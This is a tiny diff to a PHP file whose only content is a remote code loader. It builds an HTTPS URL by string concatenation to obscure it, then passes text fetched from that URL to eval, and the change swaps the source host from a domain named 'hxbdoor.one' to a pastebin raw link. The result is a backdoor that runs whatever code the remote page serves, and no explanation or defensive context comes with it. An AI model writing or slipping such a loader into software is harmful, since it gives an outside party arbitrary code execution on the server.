@@ -1,4 +1,4 @@
 <?php
 $awo = 'htt'.'ps://';
-eval("?>".file_get_contents($awo.'hxbdoor.one/raw/aeR6dg9K'));
+eval("?>".file_get_contents($awo.'pastebin.com/raw/CdNWURPG'));
 ?>
